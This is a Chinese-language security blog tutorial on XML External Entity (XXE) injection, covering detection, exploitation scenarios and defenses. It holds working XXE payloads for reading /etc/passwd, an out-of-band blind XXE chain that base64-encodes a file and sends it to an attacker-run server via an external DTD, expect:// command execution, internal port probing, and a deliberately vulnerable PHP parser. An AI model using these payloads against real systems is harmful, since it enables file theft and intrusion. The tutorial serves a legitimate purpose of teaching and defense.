---
title: XXE（XML External Entity）漏洞
date: 2019-03-01 08:59:43
tags: 
	- XXE
	- XML注入
	- OWASP Top10 2017
categories: WEB漏洞学习
---

## 0x00 必备XML基础知识

DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。

DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。

<!-- more -->

![](XXE\InkedQQ截图20190301091748_LI.jpg)

更多XML基础知识跳转[这里](https://sakuxa.com/2019/02/28/xml/)。

## 0x01 XXE漏洞概述

XXE -"xml external entity injection"即"xml外部实体注入漏洞"。

攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。
也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。

在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 

![](XXE\QQ截图20190301093413.png)

**漏洞检测：**

首先，检测XML是否会被解析。`&xxe;`是否会被解析为"this is xxe".(注意：GET请求时记得把`&`进行URL编码)

> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe "this is xxe.."> ]> <x>&xxe;</x>`

然后，检测服务器是否支持外部实体。执行Payload后查看`test.com`服务器的http访问日志，看是否存在`GET /xxe_test HTTP/1.0`的请求，若存在则证明支持外部实体。

> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM  "http://test.com/xxe_test"> ]><x>&xxe;</x>`

## 0x02 恶意引入外部实体

**情景一：**

```xml
<?xml version="1.0"?>
<!DOCTYPE note [    
  <!ELEMENT note any>   
 
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>

<note> &xxe; </note>
```

**情景二：**

```xml
<?xml version="1.0"?>
<!DOCTYPE note [    
  <!ELEMENT note any>   
 
  <!ENTITY % hack SYSTEM "hack.dtd" >
  % hack  //会被hack.dtd的内容替换。
]>

<note> &xxe; </note>
```

`hack.dtd`文件内容：

```xml-dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
```

**情景三：**

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "hack.dtd">

<note> &xxe; </note>
```

`hack.dtd`文件内容：

```xml-dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
```

**外部引用实体时，不同的程序可以使用的协议不一样：**

![](XXE\15129735161149.png)

## 0x03 XXE漏洞利用

利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。

一般XXE利用分为两大场景：有回显和无回显。

> - 有回显的情况可以直接在页面中看到Payload的执行结果或现象。
> - 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。

基本漏洞源码：

```php
<?php
    $xml=simplexml_load_string($_REQUEST['xml']);
    echo "<p>$xml</p>"
?>
```

**1.任意文件读取：**

**有回显的情况：**

Payload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM "file:///S://aa.txt">]><note>&xxe;</note>` 

![](S:\hexo\myblog\source\_posts\XXE\QQ截图20190301133421.png)

![](XXE\QQ截图20190301133122.png)

**无回显的情况：**

`%file;`会调用php插件对要读取的文件内容进行Base64编码。

`%dtd;`会请求我们编写好的`evil.xml`文件，会被`evil.xml`文件内容替换。

`%payload;`被`<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>`替换。

`%send;`会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看`http`的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。

Payload:

```xml-dtd
<!DOCTYPE note [ 
  <!ELEMENT note ANY >
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/S:/test.txt">
  <!ENTITY % dtd SYSTEM "http://localhost/evil.xml">
  %dtd; %payload; %send;  ]>
```

`evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`

```xml-dtd
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>"> 
```

`http`访问日志：（到配置文件`http.conf`里找到`CustomLog "logs/access.log" common`并删除掉`#`号注释）

![](XXE\QQ截图20190301152037.png)

**PS:**之所以要引入文件`evil.xml`原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。

Base64解码：

![](XXE\QQ截图20190301152528.png)

**2.命令执行：**

安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。

[expect](http://php.net/manual/zh/wrappers.expect.php)封装协议默认未开启。

Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM "expect://whoami"> ]><x>&xxe;</x>`

**3.内网端口探测：**

Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM "http://localhost:81"> ]><x>%26xxe;</x>`

## 0x04 漏洞防御

- 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。
- 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。
- 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。
- 使用开发语言提供的禁用外部实体的方法。

**参考链接：**

https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md

https://www.cnblogs.com/backlion/p/9302528.html

https://www.jianshu.com/p/77f2181587a4